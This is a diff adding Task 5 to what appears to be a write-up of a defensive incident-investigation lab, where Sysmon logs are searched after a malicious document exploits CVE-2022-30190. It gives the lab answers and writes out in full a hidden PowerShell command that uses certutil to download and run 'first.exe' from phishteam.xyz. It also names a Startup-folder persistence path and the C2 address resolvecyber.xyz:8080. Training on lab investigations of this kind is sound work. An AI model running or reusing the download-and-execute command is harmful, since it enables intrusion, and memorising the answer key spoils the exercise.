@@ -85,3 +85,76 @@ Study the payload for a bit and after a bit of googling, we'll find this page: h
 ![image](https://github.com/user-attachments/assets/0e313d89-df2a-4dff-8e41-c5c31ece67a3)
 
 ANS: 2022-30190
+
+=================================================
+
+<span style="color: #ff5965;">Task 5</span><span style="color: #e5e3df;">Initial Access - Stage 2 execution</span>
+
+Malicious Document - Stage 2
+
+Based on the initial findings, we discovered that there is a stage 2 execution:
+
+- The document has successfully executed an encoded base64 command.
+- Decoding this string reveals the exact command chain executed by the malicious document.
+
+Investigation Guide
+
+With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:
+
+- The Autostart execution reflects explorer.exe as its parent process ID.
+- Child processes of explorer.exe within the event timeframe could be significant.
+- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.
+
+Significant Data Sources:
+
+- <span style="color: #d4d0ca;">Sysmon</span>
+
+Answer the questions below
+
+Q1: The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
+
+Decode the base64
+
+![image](https://github.com/user-attachments/assets/8415f76e-80e3-4e95-8d0d-291f6584ec94)
+
+
+![image](https://github.com/user-attachments/assets/9a542c9b-a2fe-40e9-8cce-36784425a206)
+
+
+ANS: C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+Q2: The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?
+
+*Format: Remove the double quotes from the log.*
+
+We figure that the payload will autostart and a process will be created with explorer as our parent process. After using the appropriate filters, we found this.
+
+![image](https://github.com/user-attachments/assets/3ec550e9-9524-4cd7-bf1a-98e4ef731712)
+
+
+ANS: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
+
+Q3: Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
+
+Look for the instances of the downloaded "first.exe"
+
+![image](https://github.com/user-attachments/assets/dfbd6b78-a896-4bbd-b266-bf9140585264)
+
+
+ANS: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
+
+Q4: The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
+
+*Format: domain:port*
+
+After looking around the events surrounding "first.exe", we found this:
+
+![image](https://github.com/user-attachments/assets/733ba95c-8030-4001-8632-2ca9523f68b3)
+
+
+We'll also notice that the IP resolve to this:
+
+![image](https://github.com/user-attachments/assets/ea827a27-aaee-48dc-87af-3563a8f6fba7)
+
+
+ANS: resolvecyber.xyz:8080
